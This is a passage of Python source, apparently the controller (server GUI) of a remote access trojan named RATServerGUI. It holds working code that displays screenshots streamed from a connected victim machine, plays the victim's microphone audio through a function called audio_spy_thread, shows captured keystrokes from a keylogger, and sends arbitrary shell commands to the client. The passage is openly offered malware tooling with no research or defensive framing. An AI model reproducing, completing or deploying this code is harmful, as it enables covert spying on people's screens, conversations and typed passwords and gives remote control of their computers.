            if self.current_client_socket:
                self.current_client_socket.send(b'STOP_SCRSHOOT')
            
            self.log("Screenshot receiver stopped")
            
        except Exception as e:
            self.log(f"Screenshot receiver thread error: {e}")
        
        # Reset UI elements
        self._reset_ui_elements()

    def _process_frame_data(self, frame_data, frame_number):
        """Process a complete frame of screenshot data"""
        try:
            # Decompress the data
            try:
                decompress_imdata = zlib.decompress(frame_data)
            except zlib.error as ze:
                self.log(f"Decompression Error On Frame {frame_number}: {ze}")
                return False
            
            # Convert to numpy array and decode
            npimg = np.frombuffer(decompress_imdata, dtype=np.uint8)
            decode_img = cv2.imdecode(npimg, cv2.IMREAD_COLOR)
            
            # Check if decoding was successful
            if decode_img is None:
                self.log(f"Failed To Decode Image From Frame {frame_number}")
                return False
            
            # Convert color space for display
            colored_image = cv2.cvtColor(decode_img, cv2.COLOR_BGR2RGB)
            
            # Convert to PIL Image for tkinter
            img = Image.fromarray(colored_image)
            
            # Display the image - main monitoring display
            self._update_monitor_display(img)
            
            # Display in remote desktop if available
            self._update_remote_desktop_display(img.copy())
            
            # Log occasional frame statistics (every 30 frames)
            if frame_number % 30 == 0:
                self.log(f"Received Complete Frame {frame_number}: {len(frame_data)} bytes")
            
            return True
            
        except Exception as e:
            self.log(f"Error Processing Frame {frame_number}: {e}")
            return False

    def _update_monitor_display(self, img):
        """Update the main monitoring display with the screenshot"""
        try:
            # Get image dimensions
            img_width, img_height = img.size
            
            # Get display dimensions
            screen_width = self.screen_display.winfo_width()
            screen_height = self.screen_display.winfo_height()
            
            # Only proceed if display has been rendered
            if screen_width > 10 and screen_height > 10:
                # Create a blank canvas
                monitor_canvas = Image.new('RGB', (screen_width, screen_height), color='black')
                
                # Calculate scaled dimensions
                scale = min(screen_width / img_width, screen_height / img_height)
                new_width = int(img_width * scale)
                new_height = int(img_height * scale)
                
                # Resize the image
                monitor_img = img.resize((new_width, new_height), Image.LANCZOS)
                
                # Calculate position to center the image
                x_offset = (screen_width - new_width) // 2
                y_offset = (screen_height - new_height) // 2
                
                # Paste the resized image onto the canvas
                monitor_canvas.paste(monitor_img, (x_offset, y_offset))
                
                # Convert to PhotoImage and display
                monitor_img_tk = ImageTk.PhotoImage(image=monitor_canvas)
                self.screen_display.configure(image=monitor_img_tk)
                self.screen_display.image = monitor_img_tk  # Keep a reference
        except Exception as e:
            self.log(f"Error Updating Monitor Display: {e}")

    def _update_remote_desktop_display(self, img):
        """Update the remote desktop display if available"""
        try:
            if hasattr(self, 'remote_desktop') and hasattr(self.remote_desktop, 'screen_label'):
                # Get image dimensions
                img_width, img_height = img.size
                
                # Get remote desktop dimensions
                remote_width = self.remote_desktop.screen_label.winfo_width()
                remote_height = self.remote_desktop.screen_label.winfo_height()
                
                if remote_width > 10 and remote_height > 10:
                    # Create a blank canvas
                    remote_canvas = Image.new('RGB', (remote_width, remote_height), color='black')
                    
                    # Calculate scaled dimensions
                    scale = min(remote_width / img_width, remote_height / img_height)
                    new_width = int(img_width * scale)
                    new_height = int(img_height * scale)
                    
                    # Resize the image
                    remote_img = img.resize((new_width, new_height), Image.LANCZOS)
                    
                    # Calculate position to center the image
                    x_offset = (remote_width - new_width) // 2
                    y_offset = (remote_height - new_height) // 2
                    
                    # Paste the resized image onto the canvas
                    remote_canvas.paste(remote_img, (x_offset, y_offset))
                    
                    # Convert to PhotoImage and display
                    remote_img_tk = ImageTk.PhotoImage(image=remote_canvas)
                    self.remote_desktop.screen_label.configure(image=remote_img_tk)
                    self.remote_desktop.screen_label.image = remote_img_tk  # Keep a reference
                    
                    # Update client dimensions for mouse movement scaling
                    if hasattr(self.remote_desktop, 'client_width'):
                        self.remote_desktop.client_width = img_width
                        self.remote_desktop.client_height = img_height
                    
                    # Notify the remote desktop controller about the received frame
                    if hasattr(self.remote_desktop, 'on_frame_received') and self.remote_desktop.is_controlling:
                        # Use img size for bandwidth calculation
                        img_buffer = io.BytesIO()
                        img.save(img_buffer, format='JPEG')
                        self.remote_desktop.on_frame_received(len(img_buffer.getvalue()))
        except Exception as e:
            self.log(f"Error Updating Remote Desktop Display: {e}")

    def _reset_ui_elements(self):
        """Reset UI elements after screenshot thread stops"""
        try:
            # Reset main display UI
            self.start_screen_btn.configure(state="normal")
            self.stop_screen_btn.configure(state="disabled")
            self.screen_display.configure(image="")
            self.screen_display.configure(text="No screen capture active")
            
            # Reset remote desktop display if it exists
            if hasattr(self, 'remote_desktop') and hasattr(self.remote_desktop, 'screen_label'):
                self.remote_desktop.screen_label.configure(image="")
                self.remote_desktop.screen_label.configure(text="Remote desktop view will appear here")
        except Exception as e:
            self.log(f"Error resetting UI elements: {e}")
    
    def stop_screen_capture(self):
        self.receive_screenshot_trigger = False
        self.log("Stopped Screen Capture")
    
    def start_audio_monitoring(self):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        self.audiospy_trigger = True
        threading.Thread(target=self.audio_spy_thread, daemon=True).start()
        
        # Update UI
        self.start_audio_btn.configure(state="disabled")
        self.stop_audio_btn.configure(state="normal")
        self.audio_display.configure(text="Audio monitoring active")
        self.log("Started audio monitoring")
    
    def audio_spy_thread(self):
        try:
            udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udps.bind(self.address)
            self.current_client_socket.send(b'AUDIO_SPY')
            
            paudio = pyaudio.PyAudio()
            audio_stream = paudio.open(channels=2, rate=44100, format=pyaudio.paInt16, output=True)
            
            while self.audiospy_trigger:
                try:
                    size_ = struct.unpack('Q', udps.recvfrom(8)[0])[0]
                    audio_data = udps.recvfrom(size_)[0]
                    audio_stream.write(audio_data, exception_on_underflow=False)
                except Exception as e:
                    if not self.audiospy_trigger:
                        break
                    self.log(f"Audio monitoring error: {e}")
                    continue
            
            # Cleanup
            audio_stream.stop_stream()
            audio_stream.close()
            paudio.terminate()
            udps.close()
            
            if self.current_client_socket:
                self.current_client_socket.send(b'CLOSE_AUDIO_SPY')
            
        except Exception as e:
            self.log(f"Audio monitoring thread error: {e}")
        
        # Reset UI
        self.start_audio_btn.configure(state="normal")
        self.stop_audio_btn.configure(state="disabled")
        self.audio_display.configure(text="No audio monitoring active")
    
    def stop_audio_monitoring(self):
        self.audiospy_trigger = False
        self.log("Stopped audio monitoring")
    
    def start_keylogger(self):
        if not self.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        self.keyboard_recording_trigger = True
        threading.Thread(target=self.keyboard_record_thread, daemon=True).start()
        
        # Update UI
        self.start_keyboard_btn.configure(state="disabled")
        self.stop_keyboard_btn.configure(state="normal")
        self.keyboard_log.delete(1.0, tk.END)
        self.log("Started keylogger")
    
    def keyboard_record_thread(self):
        try:
            self.current_client_socket.send(b'KEY_REC')
            full_word = ''
            
            while self.keyboard_recording_trigger:
                try:
                    data = self.current_client_socket.recv(self.BUFFER).decode().strip("'")
                    if not data:
                        continue
                    
                    if '' in data:
                        # Backspace
                        full_word = full_word[:-1]
                    elif '\n' in data:
                        full_word += '\n'
                    else:
                        full_word += data
                    
                    # Update keyboard log
                    self.keyboard_log.delete(1.0, tk.END)
                    self.keyboard_log.insert(tk.END, full_word)
                    self.keyboard_log.see(tk.END)
                
                except Exception as e:
                    if not self.keyboard_recording_trigger:
                        break
                    self.log(f"Keylogger error: {e}")
                    continue
            
            # Stop keylogger on client
            if self.current_client_socket:
                self.current_client_socket.send(b'STOP_KEY_REC')
            
        except Exception as e:
            self.log(f"Keylogger thread error: {e}")
        
        # Reset UI
        self.start_keyboard_btn.configure(state="normal")
        self.stop_keyboard_btn.configure(state="disabled")
    
    def stop_keylogger(self):
        self.keyboard_recording_trigger = False
        self.log("Stopped keylogger")
    
    # Helper functions from original code
    def data_unpacker(self, data) -> int:
        return struct.unpack('Q', data)[0]
    
    def getHostName(self, client_socket) -> str:
        client_socket.send('GETHOSTNAME'.encode())
        hostname = client_socket.recv(self.BUFFER)
        return hostname.decode()
    
    def send_cmd(self, client_socket, command) -> tuple:
        xcommand = 'CMD_COMMAND_' + command
        client_socket.send(xcommand.encode('utf-8'))
        size_ = self.data_unpacker(client_socket.recv(self.BUFFER))
        data = client_socket.recv(size_)
        return (data, size_)
    
    def validate_string(self, text):
        if len(text) == 0:
            return False
        elif text == '':
            return False
        elif text == ' ':
            return False
        elif text.isspace():
            return False
        return True
    
    def run(self):
        # Run the main application loop
        self.root.mainloop()


if __name__ == "__main__":
    # Handle import errors gracefully
    missing_modules = []
    try:
        import customtkinter as ctk
    except ImportError:
        missing_modules.append("customtkinter")
    
    try:
        from PIL import ImageTk
    except ImportError:
        missing_modules.append("pillow")
    
    if missing_modules:
        try:
            import tkinter as tk
            from tkinter import messagebox
            
            root = tk.Tk()
            root.withdraw()
            
            messagebox.showerror(
                "Missing Dependencies",
                f"Please install the following Python modules:\n\n" +
                "\n".join(f"- {module}" for module in missing_modules) +
                "\n\nInstall using: pip install " + " ".join(missing_modules)
            )
            
            root.destroy()
        except:
            print("Error: Missing dependencies:", ", ".join(missing_modules))
            print("Install using: pip install", " ".join(missing_modules))
        
        exit(1)
    
    # Start application
    app = RATServerGUI()
    app.run()